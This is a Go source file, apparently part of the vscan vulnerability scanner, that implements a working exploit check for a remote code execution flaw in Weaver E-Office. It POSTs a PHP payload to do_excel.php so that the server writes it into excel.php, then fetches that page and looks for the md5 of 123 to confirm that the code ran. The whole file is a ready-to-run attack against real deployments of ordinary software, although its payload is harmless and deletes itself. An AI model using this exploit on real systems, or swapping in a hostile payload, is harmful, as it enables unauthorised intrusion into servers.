package weaver

import (
	"fmt"
	"github.com/veo/vscan/pkg"
	"strings"
)

func E_Office_do_excel_php_rce(u string) bool {
	header := make(map[string]string)
	header["Content-Type"] = "application/x-www-form-urlencoded"
	header["Accept-Encoding"] = "gzip, deflate"
	header["Cache-Control"] = "0"
	header["Upgrade-Insecure-Requests"] = "1"
	header["Accept-Language"] = "zh-CN,zh;q=0.9"

	payload := `html=<?php echo md5(123);unlink(__FILE__);?>`
	url := u + "/general/charge/charge_list/excel.php"
	url2 := u + "/general/charge/charge_list/do_excel.php"

	if req, err := pkg.HttpRequset(url2, "POST", payload, false, header); err == nil {
		//pkg.GoPocLog(req.Body)
		if req2, err := pkg.HttpRequset(url, "GET", "", false, header); err == nil {
			//pkg.GoPocLog(req2.Body)
			if req.StatusCode == 200 && strings.Contains(req2.Body, "202cb962ac59075b964b07152d234b70") {
				pkg.GoPocLog(fmt.Sprintf("Found vuln E_Office_do_excel_php_rce|%s\n", url))
				return true
			}
		} else if req3, err := pkg.HttpRequset(url2, "GET", "", false, header); err == nil {
			//pkg.GoPocLog(req3.Body)

			if req.StatusCode == 200 && strings.Contains(req3.Body, "202cb962ac59075b964b07152d234b70") {
				pkg.GoPocLog(fmt.Sprintf("Found vuln E_Office_do_excel_php_rce|%s\n", url2))
				return true
			}
		}
	}

	return false
}
